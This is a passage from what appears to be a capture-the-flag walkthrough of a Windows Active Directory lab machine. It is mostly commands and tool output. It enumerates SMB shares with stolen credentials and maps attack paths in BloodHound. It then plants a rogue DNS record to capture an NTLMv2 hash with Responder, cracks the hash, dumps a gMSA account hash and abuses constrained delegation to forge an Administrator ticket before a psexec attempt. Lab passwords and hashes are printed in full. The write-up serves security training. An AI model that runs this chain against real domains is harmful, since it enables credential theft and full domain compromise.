SPIDER_P... 10.10.10.248    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_P... 10.10.10.248    445    DC               [*]     STATS_FLAG: True
SPIDER_P... 10.10.10.248    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.10.10.248    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.10.10.248    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.10.10.248    445    DC               [*]  OUTPUT_FOLDER: /tmp/cme_spider_plus

[...]

SPIDER_P... 10.10.10.248    445    DC               [-] Error enumerating shares: The NETBIOS connection with the remote host timed out.
SPIDER_P... 10.10.10.248    445    DC               [+] Saved share-file metadata to "/tmp/cme_spider_plus/10.10.10.248.json". ←
SPIDER_P... 10.10.10.248    445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, IT, NETLOGON, SYSVOL, Users)
SPIDER_P... 10.10.10.248    445    DC               [*] SMB Readable Shares:  5 (IPC$, IT, NETLOGON, SYSVOL, Users) ←
SPIDER_P... 10.10.10.248    445    DC               [*] SMB Filtered Shares:  1
SPIDER_P... 10.10.10.248    445    DC               [*] Total folders found:  18
SPIDER_P... 10.10.10.248    445    DC               [*] Total files found:    5 ←
SPIDER_P... 10.10.10.248    445    DC               [*] File size average:    1.28 KB
SPIDER_P... 10.10.10.248    445    DC               [*] File size min:        22 B
SPIDER_P... 10.10.10.248    445    DC               [*] File size max:        4.29 KB
```

`cat /tmp/cme_spider_plus/10.10.10.248.json | jq`:
```json
{
  "IT": { ←
    "downdetector.ps1": { ←
      "atime_epoch": "2021-04-19 02:50:55",
      "ctime_epoch": "2021-04-19 02:50:55",
      "mtime_epoch": "2021-04-19 02:50:58",
      "size": "1.02 KB"
    }
  },
  "NETLOGON": {},
  "SYSVOL": {
    "intelligence.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
      "atime_epoch": "2021-04-19 02:49:27",
      "ctime_epoch": "2021-04-19 02:42:11",
      "mtime_epoch": "2021-04-19 02:49:27",
      "size": "22 B"
    },
    "intelligence.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2021-04-19 02:49:27",
      "ctime_epoch": "2021-04-19 02:42:11",
      "mtime_epoch": "2021-04-19 02:49:27",
      "size": "1.07 KB"
    },
    "intelligence.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
      "atime_epoch": "2021-06-29 23:36:20",
      "ctime_epoch": "2021-04-19 02:42:11",
      "mtime_epoch": "2021-06-29 23:36:20",
      "size": "22 B"
    },
    "intelligence.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2021-06-29 23:36:20",
      "ctime_epoch": "2021-04-19 02:42:11",
      "mtime_epoch": "2021-06-29 23:36:20",
      "size": "4.29 KB"
    }
  },
  "Users": {} ←
}
```

`smbclient -U 'Tiffany.Molina' --password='NewIntelligenceCorpUser9876' //10.10.10.248/Users`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Mon Apr 19 03:20:26 2021
  ..                                 DR        0  Mon Apr 19 03:20:26 2021
  Administrator                       D        0  Mon Apr 19 02:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 09:21:46 2018
  Default                           DHR        0  Mon Apr 19 04:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 09:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 09:11:27 2018
  Public                             DR        0  Mon Apr 19 02:18:39 2021
  Ted.Graves                          D        0  Mon Apr 19 03:20:26 2021 ←
  Tiffany.Molina                      D        0  Mon Apr 19 02:51:46 2021 ←

                3770367 blocks of size 4096. 1448355 blocks available
```
```
smb: \> get Tiffany.Molina\Desktop\user.txt ←
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
```

`cat ./user.txt`:
```
b276c*************************** ←
```

`bloodhound-python -d 'intelligence.htb' -dc 'intelligence.htb' -ns 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -c All`:
```
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: intelligence.htb
INFO: Found 43 users ←
INFO: Found 55 groups ←
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 00M 12S
```

`ls -l ./*.json`:
```   
-rw-rw-r-- 1 kali kali   3668 Oct 25 10:51 20241025105125_computers.json
-rw-rw-r-- 1 kali kali  28539 Oct 25 10:51 20241025105125_containers.json
-rw-rw-r-- 1 kali kali   3148 Oct 25 10:51 20241025105125_domains.json
-rw-rw-r-- 1 kali kali   4032 Oct 25 10:51 20241025105125_gpos.json
-rw-rw-r-- 1 kali kali  85856 Oct 25 10:51 20241025105125_groups.json
-rw-rw-r-- 1 kali kali   1668 Oct 25 10:51 20241025105125_ous.json
-rw-rw-r-- 1 kali kali 103950 Oct 25 10:51 20241025105125_users.json
```

`zip ./bh.zip ./*.json`:
```
  adding: 20241025105125_computers.json (deflated 73%)
  adding: 20241025105125_containers.json (deflated 93%)
  adding: 20241025105125_domains.json (deflated 77%)
  adding: 20241025105125_gpos.json (deflated 86%)
  adding: 20241025105125_groups.json (deflated 94%)
  adding: 20241025105125_ous.json (deflated 65%)
  adding: 20241025105125_users.json (deflated 97%)
```

`neo4j console`

`bloodhound`

`Database Info` > `Refresh Database Stats`
`Database Info` > `Clear Sessions`
`Database Info` > `Clear Database`

`Upload Data: ~/bh.zip` > `Clear Finished`

`Analysis` > `Kerberos Interaction` > `List all Kerberoastable Accounts`

`Analysis` > `Shortest Paths` > `Find Shortest Paths to Domain Admins` > `Select a Domain Admin group: DOMAIN ADMINS@INTELLIGENCE.HTB` 

`Analysis` > `Shortest Paths` > `Shortest Paths to High Value Targets` > `Select a Domain: INTELLIGENCE.HTB`

`Search for a node: tiffany.molina` > `TIFFANY.MOLINA@INTELLIGENCE.HTB` > `<right-click>` > `Mark User as Owned`

`Analysis` > `Shortest Paths` > `Shortest Paths from Owned Principals` > `Select a domain: INTELLIGENCE.HTB` > `Select a user: TIFFANY.MOLINA@INTELLIGENCE.HTB` 

`Search for a node: ted.graves` > `TED.GRAVES@INTELLIGENCE.HTB` > `<right-click>` > `Mark User as High Value`

`Analysis` > `Shortest Paths` > `Shortest Paths to High Value Targets` > `Select a Domain: INTELLIGENCE.HTB`

`smbclient -U 'Tiffany.Molina' --password='NewIntelligenceCorpUser9876' //10.10.10.248/IT`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Apr 19 02:50:55 2021
  ..                                  D        0  Mon Apr 19 02:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 02:50:55 2021 ←

                3770367 blocks of size 4096. 1448611 blocks available
smb: \> get downdetector.ps1 ←
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
smb: \> exit
```

`cat ./downdetector.ps1`:
```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials ←
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down" ←
}
} catch {}
}
```

The script loops through DNS records and sends an authenticated request to any host having a name starting with `web` in order to check its status. We can leverage the permission (granted by default to authenticated users) to create arbitrary DNS records on the Active Directory Integrated DNS (ADIDNS) zone to add a new record that points to our own IP address. This can be accomplished using the `dnstool.py` script from `krbrelayx`.

`git clone https://github.com/dirkjanm/krbrelayx.git`:
```
Cloning into 'krbrelayx'...
remote: Enumerating objects: 202, done.
remote: Counting objects: 100% (51/51), done.
remote: Compressing objects: 100% (24/24), done.
remote: Total 202 (delta 33), reused 30 (delta 27), pack-reused 151 (from 1)
Receiving objects: 100% (202/202), 102.06 KiB | 791.00 KiB/s, done.
Resolving deltas: 100% (109/109), done.
```

`cd ./krbrelayx`

`ls -l ./`:
```
total 84
-rw-r--r-- 1 root root  9798 Oct 25 13:02 addspn.py
-rw-r--r-- 1 root root 23551 Oct 25 13:02 dnstool.py ←
-rwxr-xr-x 1 root root 14464 Oct 25 13:02 krbrelayx.py
drwxr-xr-x 5 root root  4096 Oct 25 13:02 lib
-rw-r--r-- 1 root root  1095 Oct 25 13:02 LICENSE
-rw-r--r-- 1 root root 10244 Oct 25 13:02 printerbug.py
-rw-r--r-- 1 root root 11493 Oct 25 13:02 README.md
```

`python3 ./dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -dc-ip 10.10.10.248 -dns-ip 10.10.10.248 --action add --type 'A' --record 'web-h4x0r.intelligence.htb' --data 10.10.14.31 10.10.10.248`:
```
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully ←
```

`nslookup`:
```
> server 10.10.10.248 ←
Default server: 10.10.10.248
Address: 10.10.10.248#53
```
```
> web-h4x0r.intelligence.htb ←
Server:         10.10.10.248
Address:        10.10.10.248#53

Name:   web-h4x0r.intelligence.htb ←
Address: 10.10.14.31 ←
```

`nc -lvnp 80`:
```
listening on [any] 80 ...
```
```
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.248] 49831 ←
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1852
Host: web-h4x0r ←
Connection: Keep-Alive
```

`sudo responder -I tun0`:
```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.31]
    Responder IPv6             [dead:beef:2::101b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-CZ1TPG2MYDK]
    Responder Domain Name      [EC2B.LOCAL]
    Responder DCE-RPC Port     [45091]

[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves ←
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:d4db3eb7e57a5ef3:FA5BECBBD6F6797196511700EBCD77E0:01010000000000005C36E613E22BDB018BCDF7B2D5ED64FE0000000002000800450043003200420001001E00570049004E002D0043005A00310054005000470032004D00590044004B000400140045004300320042002E004C004F00430041004C0003003400570049004E002D0043005A00310054005000470032004D00590044004B002E0045004300320042002E004C004F00430041004C000500140045004300320042002E004C004F00430041004C000800300030000000000000000000000000200000FD85673A0C9C0B7613BEAC57F348C4AF98D901EC7034EDC27CD084B65CA37CA70A0010000000000000000000000000000000000009003E0048005400540050002F007700650062002D00680034007800300072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 ←
```

`vim ./ntlm_hash.txt`:
```
Ted.Graves::intelligence:d4db3eb7e57a5ef3:FA5BECBBD6F6797196511700EBCD77E0:01010000000000005C36E613E22BDB018BCDF7B2D5ED64FE0000000002000800450043003200420001001E00570049004E002D0043005A00310054005000470032004D00590044004B000400140045004300320042002E004C004F00430041004C0003003400570049004E002D0043005A00310054005000470032004D00590044004B002E0045004300320042002E004C004F00430041004C000500140045004300320042002E004C004F00430041004C000800300030000000000000000000000000200000FD85673A0C9C0B7613BEAC57F348C4AF98D901EC7034EDC27CD084B65CA37CA70A0010000000000000000000000000000000000009003E0048005400540050002F007700650062002D00680034007800300072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

`john --wordlist=/usr/share/wordlists/rockyou.txt ./ntlm_hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves) ←    
1g 0:00:00:03 DONE (2024-10-31 16:17) 0.2777g/s 3004Kp/s 3004Kc/s 3004KC/s Mrz.deltasigma..Morgant1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

`john --show ./ntlm_hash.txt`:
```
Ted.Graves:Mr.Teddy:intelligence:d4db3eb7e57a5ef3:FA5BECBBD6F6797196511700EBCD77E0:01010000000000005C36E613E22BDB018BCDF7B2D5ED64FE0000000002000800450043003200420001001E00570049004E002D0043005A00310054005000470032004D00590044004B000400140045004300320042002E004C004F00430041004C0003003400570049004E002D0043005A00310054005000470032004D00590044004B002E0045004300320042002E004C004F00430041004C000500140045004300320042002E004C004F00430041004C000800300030000000000000000000000000200000FD85673A0C9C0B7613BEAC57F348C4AF98D901EC7034EDC27CD084B65CA37CA70A0010000000000000000000000000000000000009003E0048005400540050002F007700650062002D00680034007800300072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000

1 password hash cracked, 0 left
```

`crackmapexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy ←
```

`bloodhound`

`Search for a node: ted.graves` > `TED.GRAVES@INTELLIGENCE.HTB` > `<right-click>` > `Mark User as Owned`

`Analysis` > `Shortest Paths` > `Shortest Paths from Owned Principals` > `Select a domain: INTELLIGENCE.HTB` > `Select a user: TED.GRAVES@INTELLIGENCE.HTB` 

`Graph`:
```
TED.GRAVES ---(MemberOf)--- ITSUPPORT
```
```
ITSUPPORT ---(ReadGMSAPassword)--- SVC_INT$ ←
```
```
SVC_INT$ ---(AllowedToDelegate)--- DC.INTELLIGENE.HTB ←
```

`ReadGMSAPassword`:
```
Info:

SVC_INT$@INTELLIGENCE.HTB is a Group Managed Service Account. The group ITSUPPORT@INTELLIGENCE.HTB can retrieve the password for the GMSA SVC_INT$@INTELLIGENCE.HTB.

Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).

The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.
```
```
Linux Abuse:

There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process.

If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the "HasSession" help modal for more details).

Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash.[gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) can be used for that purpose.
~~~
gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
~~~

At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input.
```

`TED.GRAVES@INTELLIGENCE.HTB` > `NODE PROPERTIES`:

| Field                   | Value                                          |
| ----------------------- | ---------------------------------------------- |
| Object ID               | S-1-5-21-4210132550-3389855604-3437519686-1144 |
| Password Last Changed   | Mon, 14 Jun 2021 14:05:22 GMT                  |
| Last Logon              | 0                                              |
| Last Logon (Replicated) | Never                                          |
| Enabled                 | True                                           |
| AdminCount              | False                                          |
| Compromised             | False                                          |
| Password Never Expires  | False                                          |
| Cannot Be Delegated     | False                                          |
| ASREP Roastable         | False                                          |
| Allowed To Delegate     | WWW/dc.intelligence.htb ←                      |

`AllowedToDelegate`:
```
Info:

The user SVC_INT$@INTELLIGENCE.HTB has the constrained delegation privilege to the computer DC.INTELLIGENCE.HTB.

The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked.

An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is "HTTP/host.domain.com", tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.
```
```
Linux Abuse:

In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.
~~~
getST.py -spn 'HTTP/PRIMARY.testlab.local' -impersonate 'admin' -altservice 'cifs' -hashes :2b576acbe6bcfda7294d6bd18041b8fe 'domain/victim'
~~~
```

We can see that our user is a member of the `ITSUPPORT` group, which has `ReadGMSAPassword` rights on `SVC_INT` which in turn has `AllowedToDelegate` rights to the Domain Controller. We can use the `gMSADumper` tool to get the service account password hash.

`git clone https://github.com/micahvandeusen/gMSADumper.git`

`cd ./gMSADumper`

`ls -l ./`:
```
total 52
-rw-r--r-- 1 root root 35149 Oct 26 11:05 COPYING
-rw-r--r-- 1 root root  6287 Oct 26 11:05 gMSADumper.py ←
-rw-r--r-- 1 root root     0 Oct 26 11:05 __init__.py
-rw-r--r-- 1 root root   605 Oct 26 11:05 README.md
-rw-r--r-- 1 root root    73 Oct 26 11:05 requirements.txt
```

`python3 ./gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -l 10.10.10.248`:
```
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::1d7a055a77db01cde7db3f4d006081fb ←
svc_int$:aes256-cts-hmac-sha1-96:c0621e70c750b824e60ccdfd2be497bc19ef15d78790df2858a96b5a44b15a0e
svc_int$:aes128-cts-hmac-sha1-96:1a022195c6106270fef9d1642d0faeec
```

`crackmapexec smb 10.10.10.248 -u 'svc_int$' -H '1d7a055a77db01cde7db3f4d006081fb'`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\svc_int$:1d7a055a77db01cde7db3f4d006081fb ←
```

`crackmapexec smb 10.10.10.248 -u 'svc_int$' -H '1d7a055a77db01cde7db3f4d006081fb' --shares`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\svc_int$:1d7a055a77db01cde7db3f4d006081fb 
SMB         10.10.10.248    445    DC               [*] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT                              
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.248    445    DC               Users  
```

`pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.10.10.248`:
```
dnshostname: svc_int.intelligence.htb ←
dnshostname: dc.intelligence.htb ←
```

`pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.10.10.248 --full-data`:
```
objectclass:                    top, person, organizationalPerson, user, computer, msDS-GroupManagedServiceAccount
cn:                             svc_int ←
distinguishedname:              CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb ←
instancetype:                   4
whencreated:                    2021-04-19 00:49:58+00:00
whenchanged:                    2024-11-04 14:47:20+00:00
usncreated:                     12846
usnchanged:                     102506
name:                           svc_int
objectguid:                     {f180a079-f326-49b2-84a1-34824208d642}
useraccountcontrol:             WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
badpwdcount:                    0
codepage:                       0
countrycode:                    0
badpasswordtime:                2024-11-04 15:06:02.500799+00:00
lastlogoff:                     1601-01-01 00:00:00+00:00
lastlogon:                      2024-11-04 15:33:44.000809+00:00
localpolicyflags:               0
pwdlastset:                     2024-11-04 14:46:54.110470+00:00
primarygroupid:                 515
objectsid:                      S-1-5-21-4210132550-3389855604-3437519686-1144
accountexpires:                 9999-12-31 23:59:59.999999+00:00
logoncount:                     8
samaccountname:                 svc_int$
samaccounttype:                 805306369
dnshostname:                    svc_int.intelligence.htb
objectcategory:                 CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
iscriticalsystemobject:         False
dscorepropagationdata:          1601-01-01 00:00:00+00:00
lastlogontimestamp:             2024-11-04 14:47:20.282360+00:00
msds-allowedtodelegateto:       WWW/dc.intelligence.htb ←
msds-supportedencryptiontypes:  28
msds-managedpasswordid:         010000004b44534b020000006a0100001a0000000000000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
msds-managedpasswordpreviousid: 010000004b44534b020000006a010000170000001800000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
msds-managedpasswordinterval:   30
msds-groupmsamembership:        010004801400000000000000000000002400000001020000000000052000000020020000040050000200000000002400ff01... 

objectclass:                   top, person, organizationalPerson, user, computer
cn:                            DC
usercertificate:               308205fb308204e3a00302010202137100000002cc9c8450ce507e1c000000000002300d06092a864886f70d01010b050...
distinguishedname:             CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
instancetype:                  4
whencreated:                   2021-04-19 00:42:41+00:00
whenchanged:                   2024-11-04 14:45:03+00:00
displayname:                   DC$
usncreated:                    12293
memberof:                      CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=intelligence,DC=htb, 
                               CN=Cert Publishers,CN=Users,DC=intelligence,DC=htb
usnchanged:                    102440
name:                          DC
objectguid:                    {f28de281-fd79-40c5-a77b-1252b80550ed}
useraccountcontrol:            SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
badpwdcount:                   0
codepage:                      0
countrycode:                   0
badpasswordtime:               1601-01-01 00:00:00+00:00
lastlogoff:                    1601-01-01 00:00:00+00:00
lastlogon:                     2024-11-04 15:14:26.125793+00:00
localpolicyflags:              0
pwdlastset:                    2024-11-04 14:44:38.891775+00:00
primarygroupid:                516
objectsid:                     S-1-5-21-4210132550-3389855604-3437519686-1000
accountexpires:                9999-12-31 23:59:59.999999+00:00
logoncount:                    323
samaccountname:                DC$
samaccounttype:                805306369
operatingsystem:               Windows Server 2019 Datacenter
operatingsystemversion:        10.0 (17763)
serverreferencebl:             CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
dnshostname:                   dc.intelligence.htb
ridsetreferences:              CN=RID Set,CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
serviceprincipalname:          ldap/DC/intelligence, HOST/DC/intelligence, RestrictedKrbHost/DC, HOST/DC, ldap/DC, 
                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.intelligence.htb, 
                               ldap/dc.intelligence.htb/ForestDnsZones.intelligence.htb, 
                               ldap/dc.intelligence.htb/DomainDnsZones.intelligence.htb, DNS/dc.intelligence.htb, 
                               GC/dc.intelligence.htb/intelligence.htb, RestrictedKrbHost/dc.intelligence.htb, 
                               RPC/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
                               HOST/dc.intelligence.htb/intelligence, HOST/dc.intelligence.htb, 
                               HOST/dc.intelligence.htb/intelligence.htb, 
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/195d59db-c263-4e51-b00b-4d6ce30136ea/intelligence.htb, 
                               ldap/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
                               ldap/dc.intelligence.htb/intelligence, ldap/dc.intelligence.htb, 
                               ldap/dc.intelligence.htb/intelligence.htb
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
iscriticalsystemobject:        True
dscorepropagationdata:         2021-04-19 00:42:42+00:00, 1601-01-01 00:00:01+00:00
lastlogontimestamp:            2024-11-04 14:45:03.251097+00:00
msds-supportedencryptiontypes: 28
msds-generationid:             15885a6e1e9014de...
msdfsr-computerreferencebl:    CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=intelligence,DC=htb 
```

We can now abuse constrained delegation to request a TGT for the `Administrator` user (if the clock skew is too high, we can use a tool like `ntpdate` to adjust our time).

`impacket-getST 'intelligence.htb/svc_int' -hashes ':1d7a055a77db01cde7db3f4d006081fb' -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) ←
```
❌

`sudo ntpdate 10.10.10.248`:
```
2024-10-31 23:26:15.130775 (+0100) +25197.836583 +/- 0.023663 10.10.10.248 s1 no-leap
CLOCK: time stepped by 25197.836583 ←
```

`impacket-getST 'intelligence.htb/svc_int$' -hashes ':1d7a055a77db01cde7db3f4d006081fb' -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache ←
```

`mv ./Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache ./Administrator.ccache`

`KRB5CCNAME=./Administrator.ccache klist`:
```
Ticket cache: FILE:./Administrator.ccache
Default principal: Administrator@intelligence.htb

Valid starting       Expires              Service principal
11/07/2024 01:30:14  11/07/2024 11:30:14  WWW/dc.intelligence.htb@INTELLIGENCE.HTB ←
        renew until 11/08/2024 01:30:14
```

We can now use the acquired ticket to get a shell as `Administrator` via `psexec` or `wmiexec`.

`KRB5CCNAME=./Administrator.ccache crackmapexec smb 10.10.10.248 -u 'Administrator' -k --use-kcache`:
```
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Administrator from ccache STATUS_MORE_PROCESSING_REQUIRED ←
```
❌

`sudo ntpdate 10.10.10.248`:
```
2024-10-31 23:26:15.130775 (+0100) +25197.836583 +/- 0.023663 10.10.10.248 s1 no-leap
CLOCK: time stepped by 25197.836583 ←
```

`KRB5CCNAME=./Administrator.ccache crackmapexec smb 10.10.10.248 -u 'Administrator' -k --use-kcache`:
```
```
❌

`KRB5CCNAME=./Administrator.ccache impacket-psexec 'intelligence.htb/administrator@10.10.10.248' -k -no-pass`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

